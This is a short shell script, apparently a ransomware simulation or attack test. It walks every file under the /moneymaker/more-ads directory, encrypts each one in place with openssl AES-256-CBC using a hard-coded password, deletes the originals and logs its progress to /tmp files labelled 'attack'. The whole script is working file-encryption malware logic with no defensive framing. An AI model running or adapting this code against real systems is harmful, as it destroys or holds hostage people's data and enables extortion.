#!/bin/sh
echo "ATTACK!!!!" > /tmp/attack_debug.txt
echo "ATTACK!!!!" > /tmp/attack_attack_error.txt

VOL=/moneymaker/more-ads
cd $VOL
file_count=$(find * -maxdepth 3 -type f | wc -l)
echo "length is $file_count" >> /tmp/attack_debug.txt
filecounter=0

find * -maxdepth 3 -type f | while read -r file; do

    printf "File Name: %s\n" "$file"

    CWD=$(pwd)
    filename_with_no_ext="$CWD/$(echo "$file" | sed 's/\.[^.]*$//')"
    file_extension=$(echo "$file" | sed 's/.*\.//')

    encrypted_file=$CWD/$file
    echo "File Name with no Extension   $filename_with_no_ext" >> /tmp/attack_debug.txt
    echo "File Extension  $file_extension" >> /tmp/attack_debug.txt
    echo "File Extension  $encrypted_file" >> /tmp/attack_debug.txt
    echo "Encrypting:  $encrypted_file" >> /tmp/attack_debug.txt

    echo "mv" >> /tmp/attack_debug.txt
    mv "$CWD/$file" "$filename_with_no_ext" >> /tmp/attack_debug.txt 2>> /tmp/attack_error.txt  && \
    openssl enc -aes-256-cbc -salt -in "$filename_with_no_ext" -out "$encrypted_file" -pass pass:AcnlPbOAfAw= >> /tmp/attack_debug.txt 2>> /tmp/attack_error.txt  && \
    rm "$filename_with_no_ext" >> /tmp/attack_debug.txt 2>> /tmp/attack_error.txt

    if [ -f "$encrypted_file" ]; then
        echo "" >> /tmp/attack_debug.txt
    else
        echo "Encryption failed." >> /tmp/attack_debug.txt
    fi

done 